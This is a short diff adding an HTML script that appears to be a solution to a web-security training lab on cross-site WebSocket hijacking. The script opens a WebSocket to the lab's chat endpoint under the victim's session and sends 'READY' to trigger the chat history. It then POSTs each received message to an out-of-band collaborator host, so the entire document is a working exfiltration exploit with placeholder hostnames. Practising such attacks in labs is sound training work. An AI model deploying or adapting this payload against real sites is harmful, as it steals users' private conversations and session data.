@@ -1,0 +1,9 @@
+<script>
+var ws = new WebSocket('wss://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/chat');
+ws.onopen = function() {
+  ws.send("READY");
+}
+ws.onmessage = function(event) {
+  fetch('https://xxxxxxxxxCOLLABORATORxxxxxxxxxxx.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+}
+</script>
